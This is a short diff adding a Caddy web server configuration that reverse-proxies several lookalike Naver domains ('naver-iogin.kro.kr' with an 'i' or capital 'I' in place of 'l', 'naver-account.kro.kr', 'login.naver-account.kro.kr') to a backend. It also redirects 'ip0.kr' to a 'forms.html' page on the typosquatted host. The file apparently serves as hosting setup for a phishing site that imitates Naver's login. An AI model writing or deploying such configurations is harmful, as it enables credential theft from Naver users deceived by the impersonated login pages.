@@ -1,0 +1,15 @@
+naver-iogin.kro.kr {
+    reverse_proxy web:80
+}
+
+naver-account.kro.kr {
+    reverse_proxy web:80
+}
+
+login.naver-account.kro.kr {
+    reverse_proxy web:80
+}
+
+ip0.kr {
+    redir https://naver-Iogin.kro.kr/forms.html html
+}
